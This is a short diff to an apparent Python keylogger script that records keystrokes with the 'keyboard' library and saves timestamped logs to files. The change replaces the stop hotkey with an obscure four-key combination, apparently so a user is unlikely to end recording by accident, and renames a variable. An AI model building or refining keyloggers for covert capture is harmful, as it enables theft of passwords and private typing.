@@ -7,13 +7,13 @@ def checkLogsPath(path):
         os.mkdir(path)
 
 def recording():
-    return keyboard.record(until=('escape + shift'))
+    return keyboard.record(until=('ctrl + esc + pause + right'))
 
 def calcualteDataAndHour():
     tempTime = datetime.now()
     return str(tempTime.strftime("%Y-%m-%d %H:%M:%S"))
 
-def writeToFile(lPath, lName, log):
+def writeToFile(lPath, lName, l):
     newLog = open(lPath+lName, "w")
-    newLog.write(str(log))
+    newLog.write(str(l))
     newLog.close()
